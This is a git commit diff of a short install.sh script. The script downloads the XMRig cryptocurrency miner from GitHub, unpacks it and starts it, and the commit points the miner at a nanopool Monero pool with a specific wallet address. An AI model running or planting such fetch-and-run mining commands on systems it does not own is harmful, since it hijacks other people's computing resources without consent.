93beb9313c5be397292b1718610afc5f843e78f4
Miwa122op1 <88389757+Miwa122op1@users.noreply.github.com>
2023-09-14 19:56:02 +0500

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,4 +1,4 @@
 wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
 tar xvzf xmrig-6.20.0-linux-x64.tar.gz
 cd xmrig-6.20.0
-./xmrig -o mine.bmpool.org:6004 -u 6129985 -p host -k
+./xmrig -o xmr-eu1.nanopool.org:14433 -u 44ohSuHqGRFZ8WKKHVbbDJdwUoQwB78nsHvemAAqHaGqhZ91z7THB1xLayZ1CSQki5buvu2tEyt7gMjkbTExNq3rDasrYVv --tls --coin monero
